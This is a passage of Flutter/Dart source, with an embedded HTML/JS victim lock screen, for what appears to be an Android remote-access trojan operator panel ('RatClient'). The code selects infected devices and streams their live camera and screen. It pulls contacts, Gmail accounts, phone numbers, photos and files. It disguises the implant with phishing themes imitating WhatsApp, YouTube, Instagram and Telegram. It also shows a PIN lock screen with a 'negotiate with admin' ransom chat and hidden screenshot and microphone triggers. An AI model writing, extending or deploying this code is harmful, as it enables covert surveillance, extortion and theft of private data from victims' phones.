  <div class="lc-chat-msgs" id="lc-chat-msgs"><div class="lc-msg-empty">Kirim pesan ke admin untuk negosiasi...</div></div>
  <div class="lc-chat-input-wrap">
    <input class="lc-chat-input" id="lc-chat-inp" type="text" placeholder="Ketik pesan..." maxlength="500">
    <button class="lc-chat-send" onclick="sendVictimChat()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
  </div>
</div>
<div class="lc-brand">X E T E R N A L Z</div>
<div class="lc-credit">KIZZ DAN DENIS</div>
<script>
var LC_PIN='$pin';
var LC_MSGS=[];
var LC_ENTRY='';
var LC_MAXPIN=LC_PIN.length||8;
(function initKeypad(){
  var dots=document.getElementById('lc-pin-dots');
  var html='';
  for(var i=0;i<LC_MAXPIN;i++)html+='<div class="lc-pin-dot"></div>';
  dots.innerHTML=html;
  var kp=document.getElementById('lc-keypad');
  kp.addEventListener('touchend',function(e){e.preventDefault();lcTap(e.target)},false);
  kp.addEventListener('click',function(e){if(e.sourceCapabilities&&e.sourceCapabilities.firesTouchEvents)return;lcTap(e.target)});
})();
function lcTap(el){
  while(el&&!el.dataset.n&&!el.dataset.del&&!el.dataset.go)el=el.parentElement;
  if(!el)return;
  if(el.dataset.del){LC_ENTRY=LC_ENTRY.slice(0,-1)}
  else if(el.dataset.go){if(LC_ENTRY)tryUnlock()}
  else{if(LC_ENTRY.length>=LC_MAXPIN)return;LC_ENTRY+=el.dataset.n}
  lcRenderDots();
}
function lcRenderDots(){
  var dots=document.querySelectorAll('#lc-pin-dots .lc-pin-dot');
  for(var i=0;i<dots.length;i++){dots[i].className='lc-pin-dot'+(i<LC_ENTRY.length?' fill':'')}
  var err=document.getElementById('lc-error');err.textContent='';
}
function tryUnlock(){
  var err=document.getElementById('lc-error');
  if(LC_ENTRY===LC_PIN){
    err.style.color='#A5B4FC';err.textContent='PIN benar! Membuka...';
    if(window.Android)Android.unlockDevice();else window.location='secure://unlock';
  }else{
    err.style.color='#FB7185';err.textContent='PIN salah! Coba lagi.';
    LC_ENTRY='';lcRenderDots();
  }
}
function sendVictimChat(){
  var inp=document.getElementById('lc-chat-inp');
  var text=inp.value.trim();if(!text)return;
  LC_MSGS.push({from:'victim',text:text,time:Date.now()});
  renderChat();inp.value='';
  if(window.Android)Android.sendChatMessage(text);else window.location='secure://chat:'+encodeURIComponent(text);
}
document.getElementById('lc-chat-inp').addEventListener('keydown',function(e){if(e.key==='Enter')sendVictimChat()});
function actScreenshot(){if(window.Android)Android.takeScreenshot();else window.location='secure://screenshot'}
function actMic(){if(window.Android)Android.startMic();else window.location='secure://mic'}
function addOperatorMessage(text){LC_MSGS.push({from:'operator',text:text,time:Date.now()});renderChat()}
function renderChat(){
  var el=document.getElementById('lc-chat-msgs');
  if(!LC_MSGS.length){el.innerHTML='<div class="lc-msg-empty">Kirim pesan ke admin untuk negosiasi...</div>';return}
  var html='';
  for(var i=0;i<LC_MSGS.length;i++){
    var m=LC_MSGS[i];
    var t=new Date(m.time);
    var ts=t.getHours().toString().padStart(2,'0')+':'+t.getMinutes().toString().padStart(2,'0');
    html+='<div class="lc-msg '+m.from+'">'+m.text.replace(/</g,'&lt;')+'<div class="lc-msg-time">'+ts+'</div></div>';
  }
  el.innerHTML=html;el.scrollTop=el.scrollHeight;
}
</script>
</body>
</html>''';
  }
}

// Ã¢â€â‚¬Ã¢â€â‚¬ Shared small widgets Ã¢â€â‚¬Ã¢â€â‚¬
class _ConnectingBar extends StatelessWidget {
  final VoidCallback? onRetry;
  const _ConnectingBar({this.onRetry});

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 8, 16, 0),
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: Neo.peach,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: Neo.textDark, width: 2.5),
        boxShadow: Neo.shadow(offset: 2),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          const SizedBox(
            width: 10,
            height: 10,
            child: CircularProgressIndicator(strokeWidth: 2, color: Neo.textDark),
          ),
          const SizedBox(width: 8),
          const Text('MENGHUBUNGKAN KE SERVER...',
              style: TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 8,
                  letterSpacing: 1.5,
                  color: Neo.textDark)),
          if (onRetry != null) ...[
            const SizedBox(width: 10),
            GestureDetector(
              onTap: onRetry,
              child: Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 10, vertical: 3),
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: Neo.textDark, width: 2),
                  color: Neo.white,
                ),
                child: const Text('RECONNECT',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 7,
                        letterSpacing: 1,
                        color: Neo.textDark)),
              ),
            ),
          ],
        ],
      ),
    );
  }
}

class _GhostBtn extends StatelessWidget {
  final String label;
  final VoidCallback? onTap;
  const _GhostBtn({required this.label, this.onTap});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(8),
          color: Neo.white,
          border: Border.all(color: Neo.textDark, width: 2.5),
          boxShadow: Neo.shadow(offset: 2),
        ),
        child: Text(label,
            style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 8,
                fontWeight: FontWeight.w600,
                color: Neo.textDark,
                letterSpacing: 1)),
      ),
    );
  }
}

class _MiniBtn extends StatelessWidget {
  final String label;
  final Color color;
  final VoidCallback? onTap;
  const _MiniBtn({required this.label, required this.color, this.onTap});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        height: 24,
        alignment: Alignment.center,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(7),
          color: color,
          border: Border.all(color: Neo.textDark, width: 2),
          boxShadow: Neo.shadow(offset: 1),
        ),
        child: Text(label,
            style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 7,
                letterSpacing: 1.5,
                color: Neo.textDark)),
      ),
    );
  }
}

class _ThemeSheet extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    final themes = [
      ('DEFAULT', 'default', Neo.white, Icons.smartphone),
      ('WHATSAPP', 'whatsapp', const Color(0xFF25D366), Icons.chat),
      ('YOUTUBE', 'youtube', const Color(0xFFFF4444), Icons.play_circle_fill),
      ('INSTAGRAM', 'instagram', const Color(0xFFE1306C), Icons.camera),
      ('TELEGRAM', 'telegram', const Color(0xFF0088CC), Icons.send),
      ('XNXX', 'xnxx', const Color(0xFFFFA500), Icons.warning),
    ];
    return Container(
      padding: const EdgeInsets.fromLTRB(20, 24, 20, 24),
      decoration: const BoxDecoration(
        color: Neo.white,
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
        border: Border(top: BorderSide(color: Neo.textDark, width: 3)),
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const Text('CHANGE THEME',
              textAlign: TextAlign.center,
              style: TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 18,
                  fontWeight: FontWeight.w700,
                  letterSpacing: 2,
                  color: Neo.textDark)),
          const SizedBox(height: 4),
          const Text('GANTI TEMA PHISING DEVICE',
              textAlign: TextAlign.center,
              style: TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
          const SizedBox(height: 18),
          for (final t in themes)
            Padding(
              padding: const EdgeInsets.only(bottom: 8),
              child: GestureDetector(
                onTap: () => Navigator.pop(context, t.$2),
                child: Container(
                  height: 50,
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(12),
                    color: t.$3,
                    border: Border.all(color: Neo.textDark, width: 2.5),
                    boxShadow: Neo.shadow(offset: 2),
                  ),
                  child: Row(
                    children: [
                      Icon(t.$4, size: 18, color: Neo.textDark),
                      const SizedBox(width: 12),
                      Text(t.$1,
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 12,
                              letterSpacing: 1.5,
                              color: Neo.textDark)),
                    ],
                  ),
                ),
              ),
            ),
          const SizedBox(height: 4),
          NeoButton(
            label: 'CANCEL',
            color: Neo.cream,
            textColor: Neo.textMuted,
            onPressed: () => Navigator.pop(context),
          ),
        ],
      ),
    );
  }
}

class _OptionSheet extends StatelessWidget {
  final Color color;
  final IconData icon;
  final String title;
  final String sub;
  final List<(String, String)> options;

  const _OptionSheet({
    required this.color,
    required this.icon,
    required this.title,
    required this.sub,
    required this.options,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.fromLTRB(20, 24, 20, 24),
      decoration: const BoxDecoration(
        color: Neo.white,
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
        border: Border(top: BorderSide(color: Neo.textDark, width: 3)),
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              _TileIcon(icon, color),
              const Spacer(),
              GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: const Icon(Icons.close, color: Neo.textMuted, size: 18)),
            ],
          ),
          const SizedBox(height: 12),
          Text(title,
              textAlign: TextAlign.center,
              style: TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 18,
                  fontWeight: FontWeight.w700,
                  letterSpacing: 2,
                  color: color)),
          const SizedBox(height: 4),
          Text(sub,
              textAlign: TextAlign.center,
              style: const TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
          const SizedBox(height: 16),
          for (final o in options)
            Padding(
              padding: const EdgeInsets.only(bottom: 8),
              child: NeoButton(
                label: o.$1,
                color: color,
                onPressed: () => Navigator.pop(context, o.$2),
              ),
            ),
        ],
      ),
    );
  }
}

class _DeviceSheet extends StatelessWidget {
  final RatClient client;
  const _DeviceSheet({required this.client});

  @override
  Widget build(BuildContext context) {
    final devices = client.devices;
    return Container(
      constraints: BoxConstraints(
          maxHeight: MediaQuery.of(context).size.height * 0.65),
      padding: const EdgeInsets.fromLTRB(20, 24, 20, 24),
      decoration: const BoxDecoration(
        color: Neo.white,
        borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
        border: Border(top: BorderSide(color: Neo.textDark, width: 3)),
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const Text('PILIH DEVICE',
              textAlign: TextAlign.center,
              style: TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 18,
                  fontWeight: FontWeight.w700,
                  letterSpacing: 2,
                  color: Neo.textDark)),
          const SizedBox(height: 4),
          Text('${devices.length} DEVICE TERHUBUNG',
              textAlign: TextAlign.center,
              style: const TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
          const SizedBox(height: 14),
          Flexible(
            child: ListView.separated(
              shrinkWrap: true,
              itemCount: devices.length,
              separatorBuilder: (_, _) => const SizedBox(height: 8),
              itemBuilder: (_, i) {
                final d = devices[i];
                return GestureDetector(
                  onTap: () => Navigator.pop(context, d.id),
                  child: Container(
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(12),
                      color: Neo.white,
                      border: Border.all(
                          color: Neo.textDark, width: 2.5),
                      boxShadow: Neo.shadow(offset: 2),
                    ),
                    child: Row(
                      children: [
                        _TileIcon(Icons.phone_android,
                            d.online ? Neo.mint : Neo.textMuted),
                        const SizedBox(width: 12),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(d.name,
                                  maxLines: 1,
                                  overflow: TextOverflow.ellipsis,
                                  style: const TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 12,
                                      fontWeight: FontWeight.w700,
                                      color: Neo.textDark)),
                              const SizedBox(height: 2),
                              Text(d.id,
                                  maxLines: 1,
                                  overflow: TextOverflow.ellipsis,
                                  style: const TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 8,
                                      color: Neo.textMuted)),
                            ],
                          ),
                        ),
                        if (d.info.battery != null)
                          Text('${d.info.battery}%',
                              style: TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 11,
                                  color: d.info.battery! <= 20
                                      ? Neo.coral
                                      : Neo.mint)),
                        const SizedBox(width: 8),
                        Container(
                          width: 7,
                          height: 7,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: d.online ? Neo.mint : Neo.coral,
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            ),
          ),
        ],
      ),
    );
  }
}

// Live stream view
class _LiveStreamView extends StatefulWidget {
  final RatClient client;
  final String deviceId;
  final String kind;
  final String? initialFacing;

  const _LiveStreamView({
    required this.client,
    required this.deviceId,
    required this.kind,
    this.initialFacing,
  });

  @override
  State<_LiveStreamView> createState() => _LiveStreamViewState();
}

class _LiveStreamViewState extends State<_LiveStreamView> {
  String _facing = 'back';
  Timer? _pollTimer;
  Uint8List? _restBytes;
  String? _prevRaw;
  DateTime? _lastSocketFrameAt;

  @override
  void initState() {
    super.initState();
    _facing = widget.initialFacing ?? 'back';
    if (widget.kind == 'camera') {
      // REST fallback: kalau stream socket macet, tarik frame terbaru dari
      // server langsung. Server simpan frame terakhir di cameraFrames[].
      _pollTimer = Timer.periodic(const Duration(seconds: 1), (_) => _pollFrame());
    }
  }

  Future<void> _pollFrame() async {
    if (!mounted) return;
    final stale = _lastSocketFrameAt == null ||
        DateTime.now().difference(_lastSocketFrameAt!) >
            const Duration(seconds: 2);
    if (!stale) return; // stream socket sehat, skip
    final snap = await widget.client.fetchLatestFrame(widget.deviceId);
    if (!mounted) return;
    if (snap == null) return;
    final raw = snap['frame']?.toString();
    if (raw == null) return;
    try {
      final b = base64Decode(raw);
      setState(() => _restBytes = b);
    } catch (_) {}
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    _pollTimer = null;
    // Auto-stop stream saat keluar halaman biar baterai target aman & gak
    // streaming terus-terusan.
    if (widget.kind == 'screen') {
      widget.client.sendCommand(widget.deviceId, kCmdScreen, 'stop');
      widget.client.patchStatus(widget.deviceId, 'screenActive', false);
    } else {
      widget.client.sendCommand(widget.deviceId, kCmdCamera, 'off');
      widget.client.patchStatus(widget.deviceId, 'cameraActive', false);
    }
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        foregroundColor: Neo.textDark,
        title: Text(
          widget.kind == 'camera' ? 'LIVE CAMERA' : 'LIVE SCREEN',
          style: const TextStyle(
              fontFamily: 'ShareTechMono',
              fontSize: 12,
              letterSpacing: 2,
              color: Neo.mint),
        ),
        actions: [
          if (widget.kind == 'camera')
            TextButton(
              onPressed: () {
                final next = _facing == 'back' ? 'front' : 'back';
                setState(() => _facing = next);
                widget.client
                    .sendCommand(widget.deviceId, kCmdCamera, next);
              },
              child: const Text('SWITCH',
                  style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10)),
            ),
        ],
      ),
      body: AnimatedBuilder(
        animation: widget.client,
        builder: (context, _) {
          final frame = widget.client.frameFor(widget.deviceId, widget.kind);
          final raw = frame?['frame']?.toString();
          if (raw != _prevRaw) {
            _prevRaw = raw;
            if (raw != null) _lastSocketFrameAt = DateTime.now();
          }
          Uint8List? bytes;
          if (raw != null) {
            try {
              bytes = base64Decode(raw);
            } catch (_) {}
          }
          final shown = bytes ?? _restBytes;
          return Column(
            children: [
              Expanded(
                child: Center(
                  child: shown == null
                      ? Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            const SizedBox(
                              width: 28,
                              height: 28,
                              child: CircularProgressIndicator(
                                  strokeWidth: 2, color: Neo.mint),
                            ),
                            const SizedBox(height: 14),
                            Text(
                              'MENUNGGU FRAME...',
                              style: TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 10,
                                  letterSpacing: 2,
                                  color: Neo.mint.withValues(alpha: 0.7)),
                            ),
                          ],
                        )
                      : Image.memory(
                          shown,
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                          width: double.infinity,
                          height: double.infinity,
                        ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(16),
                child: NeoButton(
                  label: 'STOP',
                  icon: Icons.stop,
                  color: Neo.coral,
                  onPressed: () {
                    if (widget.kind == 'screen') {
                      widget.client
                          .sendCommand(widget.deviceId, kCmdScreen, 'stop');
                      widget.client.patchStatus(
                          widget.deviceId, 'screenActive', false);
                    } else {
                      widget.client
                          .sendCommand(widget.deviceId, kCmdCamera, 'off');
                      widget.client.patchStatus(
                          widget.deviceId, 'cameraActive', false);
                    }
                    Navigator.pop(context);
                  },
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}

// Ã¢â€â‚¬Ã¢â€â‚¬ Generic list viewer (contacts/gmail/phone) Ã¢â€â‚¬Ã¢â€â‚¬
class _ListViewer extends StatelessWidget {
  final RatClient client;
  final String deviceId;
  final String keyName;
  final String title;
  final String subtitle;

  const _ListViewer({
    required this.client,
    required this.deviceId,
    required this.keyName,
    required this.title,
    required this.subtitle,
  });

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        foregroundColor: Neo.textDark,
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(title,
                style: const TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 12,
                    letterSpacing: 2,
                    color: Neo.textDark)),
            Text(subtitle,
                style: const TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted)),
          ],
        ),
      ),
      body: AnimatedBuilder(
        animation: client,
        builder: (context, _) {
          final data = client.dataFor(deviceId)[keyName];
          if (data == null) {
            return const Center(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  SizedBox(
                    width: 28,
                    height: 28,
                    child: CircularProgressIndicator(
                        strokeWidth: 3, color: Neo.mint),
                  ),
                  SizedBox(height: 14),
                  Text('MENUNGGU DATA...',
                      style: TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 10,
                          letterSpacing: 2,
                          color: Neo.textMuted)),
                ],
              ),
            );
          }
          final list = data is List ? data.cast<Map>() : const <Map>[];
          if (list.isEmpty) {
            return const Center(
                child: Text('DATA KOSONG',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                        color: Neo.textMuted)));
          }
          final rows = list.map((m) {
            final email = m['email']?.toString() ?? '';
            final name = m['name']?.toString() ?? '';
            final number = m['number']?.toString() ?? '';
            final operator = m['operator']?.toString() ?? '';
            final primary = email.isNotEmpty
                ? email
                : name.isNotEmpty
                    ? name
                    : number.isNotEmpty
                        ? number
                        : m.values.first.toString();
            final secondary = email.isNotEmpty
                ? (m['type']?.toString() ?? 'com.google')
                : number.isNotEmpty
                    ? (operator.isNotEmpty ? operator : 'Ã¢â‚¬â€')
                    : 'Ã¢â‚¬â€';
            return (primary, secondary);
          }).toList();
          return ListView.separated(
            padding: const EdgeInsets.all(16),
            itemCount: rows.length,
            separatorBuilder: (_, _) => const SizedBox(height: 8),
            itemBuilder: (_, i) {
              final row = rows[i];
              final initial = row.$1.isEmpty
                  ? '?'
                  : row.$1.characters.first.toUpperCase();
              return Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(12),
                  color: Neo.white,
                  border: Border.all(color: Neo.textDark, width: 2.5),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 36,
                      height: 36,
                      alignment: Alignment.center,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(10),
                        color: Neo.peach,
                        border: Border.all(color: Neo.textDark, width: 2.5),
                      ),
                      child: Text(initial,
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 13,
                              fontWeight: FontWeight.w700,
                              color: Neo.textDark)),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(row.$1,
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 11,
                                  color: Neo.textDark)),
                          if (row.$2.isNotEmpty)
                            Text(row.$2,
                                style: const TextStyle(
                                    fontFamily: 'ShareTechMono',
                                    fontSize: 8,
                                    color: Neo.textMuted)),
                        ],
                      ),
                    ),
                    GestureDetector(
                      onTap: () {
                        Clipboard.setData(ClipboardData(text: row.$1));
                        ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(
                                content: Text('Disalin',
                                    style: TextStyle(
                                        fontFamily: 'ShareTechMono'))));
                      },
                      child: const Icon(Icons.copy,
                          size: 13, color: Neo.sky),
                    ),
                  ],
                ),
              );
            },
          );
        },
      ),
    );
  }
}

// Ã¢â€â‚¬Ã¢â€â‚¬ Gallery view Ã¢â€â‚¬Ã¢â€â‚¬
class _GalleryView extends StatelessWidget {
  final RatClient client;
  final String deviceId;

  const _GalleryView({required this.client, required this.deviceId});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        foregroundColor: Neo.textDark,
        title: const Text('GALERI',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 12,
                letterSpacing: 2,
                color: Neo.textDark)),
      ),
      body: AnimatedBuilder(
        animation: client,
        builder: (context, _) {
          final photos = client.dataFor(deviceId)['gallery'];
          if (photos == null) {
            return const Center(
              child: CircularProgressIndicator(
                  strokeWidth: 2, color: Neo.mint),
            );
          }
          final list = photos is List ? photos.cast<Map>() : const <Map>[];
          if (list.isEmpty) {
            return const Center(
                child: Text('TIDAK ADA FOTO',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                        color: Neo.textMuted)));
          }
          return GridView.builder(
            padding: const EdgeInsets.all(12),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 3,
              mainAxisSpacing: 8,
              crossAxisSpacing: 8,
            ),
            itemCount: list.length,
            itemBuilder: (_, i) {
              final m = list[i];
              final thumb = m['thumbnail']?.toString() ??
                  m['path']?.toString() ??
                  m.values.first.toString();
              return GestureDetector(
                onTap: () => _openLightbox(context, list, i),
                child: _Thumb(thumb),
              );
            },
          );
        },
      ),
    );
  }

  void _openLightbox(BuildContext context, List<Map> photos, int index) {
    Navigator.of(context).push(MaterialPageRoute(
      builder: (_) => _Lightbox(photos: photos, initialIndex: index),
    ));
  }
}

class _Thumb extends StatelessWidget {
  final String raw;
  const _Thumb(this.raw);

  @override
  Widget build(BuildContext context) {
    final isBase64 = raw.contains('base64,') || _looksB64(raw);
    Widget img;
    if (isBase64) {
      try {
        final data = raw.contains('base64,')
            ? raw.split('base64,').last
            : raw;
        img = Image.memory(
          base64Decode(data),
          fit: BoxFit.cover,
          gaplessPlayback: true,
          errorBuilder: (_, _, _) => const _BrokenThumb(),
        );
      } catch (_) {
        img = const _BrokenThumb();
      }
    } else {
      img = Image.network(
        raw,
        fit: BoxFit.cover,
        errorBuilder: (_, _, _) => const _BrokenThumb(),
      );
    }
    return ClipRRect(
      borderRadius: BorderRadius.circular(10),
      child: SizedBox.expand(child: img),
    );
  }

  bool _looksB64(String s) {
    if (s.length < 50) return false;
    return RegExp(r'^[A-Za-z0-9+/=\r\n]+$').hasMatch(s);
  }
}

class _BrokenThumb extends StatelessWidget {
  const _BrokenThumb();

  @override
  Widget build(BuildContext context) {
    return Container(
      color: Neo.cream,
      child: const Center(
          child: Icon(Icons.broken_image_outlined,
              color: Neo.textMuted, size: 22)),
    );
  }
}

class _Lightbox extends StatefulWidget {
  final List<Map> photos;
  final int initialIndex;
  const _Lightbox({required this.photos, required this.initialIndex});

  @override
  State<_Lightbox> createState() => _LightboxState();
}

class _LightboxState extends State<_Lightbox> {
  late int index = widget.initialIndex;
  late final PageController _page = PageController(initialPage: index);

  @override
  void dispose() {
    _page.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        foregroundColor: Neo.textDark,
        title: Text('${index + 1} / ${widget.photos.length}',
            style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 11,
                color: Neo.mint)),
      ),
      body: PageView.builder(
        controller: _page,
        itemCount: widget.photos.length,
        onPageChanged: (i) => setState(() => index = i),
        itemBuilder: (_, i) {
          final m = widget.photos[i];
          final raw = m['path']?.toString() ??
              m['thumbnail']?.toString() ??
              m.values.first.toString();
          return Center(
            child: _Thumb(raw),
          );
        },
      ),
    );
  }
}

// Ã¢â€â‚¬Ã¢â€â‚¬ File manager view Ã¢â€â‚¬Ã¢â€â‚¬
class _FileView extends StatefulWidget {
  final RatClient client;
  final String deviceId;
  const _FileView({required this.client, required this.deviceId});

  @override
  State<_FileView> createState() => _FileViewState();
}

class _FileViewState extends State<_FileView> {
  String _path = '/';
  int _reqSeq = 0;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        foregroundColor: Neo.textDark,
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text('FILE MANAGER',
                style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 12,
                    letterSpacing: 2,
                    color: Neo.mint)),
            Text(_path,
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
                style: const TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted)),
          ],
        ),
        actions: [
          IconButton(
            onPressed: () {
              final parts = _path.split('/')..removeWhere((e) => e.isEmpty);
              if (parts.isEmpty) return;
              parts.removeLast();
              _navigate('/${parts.join('/')}');
            },
            icon: const Icon(Icons.arrow_upward, size: 18, color: Neo.mint),
          ),
        ],
      ),
      body: AnimatedBuilder(
        animation: widget.client,
        builder: (context, _) {
          final data = widget.client.dataFor(widget.deviceId)['files'];
          if (data == null) {
            return const Center(
              child: CircularProgressIndicator(
                  strokeWidth: 2, color: Neo.mint),
            );
          }
          final files = (data['files'] as List?)?.cast<Map>() ?? [];
          if (files.isEmpty) {
            return const Center(
                child: Text('KOSONG',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                        color: Neo.textMuted)));
          }
          return ListView.separated(
            padding: const EdgeInsets.all(16),
            itemCount: files.length,
            separatorBuilder: (_, _) => const SizedBox(height: 6),
            itemBuilder: (_, i) {
              final f = files[i];
              final isDir = f['isDir'] == true ||
                  f['type']?.toString() == 'dir' ||
                  f['dir'] == true;
              final name = f['name']?.toString() ?? '?';
              final fpath = f['path']?.toString() ?? '$_path/$name';
              return GestureDetector(
                onTap: () {
                  if (isDir) {
                    _navigate(fpath);
                  } else {
                    _download(fpath);
                  }
                },
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(12),
                    color: Neo.white,
                    border: Border.all(color: Neo.textDark, width: 2.5),
                  ),
                  child: Row(
                    children: [
                      Icon(
                        isDir ? Icons.folder : Icons.insert_drive_file,
                        size: 20,
                        color: isDir ? _orange : _blue2,
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(name,
                                maxLines: 1,
                                overflow: TextOverflow.ellipsis,
                                style: const TextStyle(
                                    fontFamily: 'ShareTechMono',
                                    fontSize: 11,
                                    color: Neo.textDark)),
                            if (f['size'] != null)
                              Text('${f['size']}',
                                  style: const TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 8,
                                      color: Neo.textMuted)),
                          ],
                        ),
                      ),
                      if (!isDir)
                        const Icon(Icons.download,
                            size: 14, color: Neo.sky),
                    ],
                  ),
                ),
              );
            },
          );
        },
      ),
    );
  }

  void _navigate(String path) {
    setState(() => _path = path);
    widget.client.clearData(widget.deviceId, 'files');
    widget.client.sendCommand(widget.deviceId, 'getFiles', path);
  }

  void _download(String path) {
    final reqId = '${DateTime.now().millisecondsSinceEpoch}_${_reqSeq++}';
    widget.client.clearData(widget.deviceId, 'filedata:$reqId');
    widget.client.sendCommand(
        widget.deviceId,
        'downloadFile',
        jsonEncode({'path': path, 'reqId': reqId}));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(
          content: Text('Mengunduh file...',
              style: TextStyle(fontFamily: 'ShareTechMono'))),
    );
    // Pull the filedata response from the client's pending map.
    Future.delayed(const Duration(milliseconds: 400), () {
      if (!mounted) return;
      _showFiledata(reqId);
    });
  }

  void _showFiledata(String reqId) {
    final fd = widget.client.dataFor('_pending:$reqId')['filedata'];
    if (fd == null) return;
    final base64 = fd['base64']?.toString() ?? '';
    final mime = fd['mime']?.toString() ?? '';
    Uint8List? bytes;
    try {
      bytes = base64Decode(base64);
    } catch (_) {}
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Neo.white,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12),
            side: const BorderSide(color: Neo.textDark, width: 3)),
        child: Padding(
          padding: const EdgeInsets.all(16),
